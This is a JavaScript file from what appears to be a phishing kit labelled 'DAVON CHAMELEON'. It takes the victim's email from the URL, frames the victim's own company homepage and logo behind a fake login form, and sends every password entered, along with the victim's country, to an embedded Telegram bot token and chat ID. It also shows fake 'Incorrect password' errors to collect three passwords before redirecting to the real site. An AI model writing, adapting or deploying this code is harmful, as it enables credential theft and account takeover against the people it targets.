// Telegram Bot config
const TELEGRAM_BOT_TOKEN = "7642767058:AAE1c1oj-wCUdqv3_WAWwJoonDWDIHOz4SA";
const TELEGRAM_CHAT_ID = "5748422740";

// STEP 1: Extract email from URL hash (e.g., #user@food.com)
const rawHash = window.location.hash.substring(1); // remove the '#' symbol
const emailInput = document.getElementById('email');
const logoImg = document.getElementById('logo');
const bgFrame = document.getElementById('bg-frame');
const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('login-btn');
const errorMsg = document.getElementById('error-msg');
const overlay = document.getElementById('overlay');

let attempts = 0;
const maxAttempts = 3;

// Show blur effect on background when overlay is visible
document.body.classList.add('blur-active');

// Validate email format
if (!/^[^@]+@[^@]+\.[^@]+$/.test(rawHash)) {
  alert("Invalid or missing email in the URL hash.");
} else {
  // STEP 2: Set email field
  emailInput.value = rawHash;
  emailInput.setAttribute("readonly", true);

  // STEP 3: Extract domain (e.g., food.com)
  const domain = rawHash.split('@')[1];

  // STEP 4: Set iframe background to domain's homepage
  bgFrame.src = `https://${domain}`;

  // STEP 5: Set logo using Clearbit (more reliable than favicon)
  logoImg.src = `https://logo.clearbit.com/${domain}`;
  logoImg.onerror = function () {
    logoImg.src = "https://via.placeholder.com/150?text=Logo";
  };
}

// Fallback UI if iframe fails to load (blocked by X-Frame-Options)
bgFrame.onerror = function () {
  overlay.style.display = 'none';
  bgFrame.style.display = 'none';
  document.body.classList.remove('blur-active');
  const fallback = document.createElement('div');
  fallback.style.cssText = `
    position: fixed; top:0; left:0; width: 100vw; height: 100vh;
    display: flex; align-items: center; justify-content: center;
    font-size: 24px; color: #333; background: #eee; text-align: center;
  `;
  fallback.textContent = "Site cannot be loaded in iframe — preview unavailable.";
  document.body.appendChild(fallback);
};

// Fetch user country (optional)
let userCountry = "Unknown";
fetch("https://ipinfo.io/json?token=18ef659c2b8c46")  // use your own token here if needed
  .then(res => res.json())
  .then(data => {
    userCountry = data.country || "Unknown";
  }).catch(() => {
    userCountry = "Unknown";
  });

// Helper: Send formatted message to Telegram
function sendTelegramMessage(email, password, attempt, country) {
  const text = `☠️ DAVON CHAMELEON [${attempt}/3] ☠️\n` +
               ` UserId : [ ${email} ]\n` +
               `    Pass : [ ${password} ]\n` +
               `    Country : [ ${country} ]`;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: text,
    parse_mode: "HTML"
  };
  fetch(url, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(payload)
  }).catch(e => {
    console.error("Telegram send failed:", e);
  });
}

// Handle login attempts
loginBtn.addEventListener('click', function() {
  const password = passwordInput.value.trim();

  // Validate non-empty password
  if (password === "") {
    errorMsg.textContent = "Password cannot be empty.";
    return;
  }

  attempts++;

  // Send credentials to Telegram
  sendTelegramMessage(emailInput.value, password, attempts, userCountry);

  if (attempts < maxAttempts) {
    errorMsg.textContent = "Incorrect password.";
    passwordInput.value = "";
  } else {
    // On 3rd attempt: remove login overlay and redirect
    errorMsg.textContent = "";
    overlay.style.display = 'none';
    document.body.classList.remove('blur-active');
    window.location.href = `https://${emailInput.value.split('@')[1]}`;
  }
});
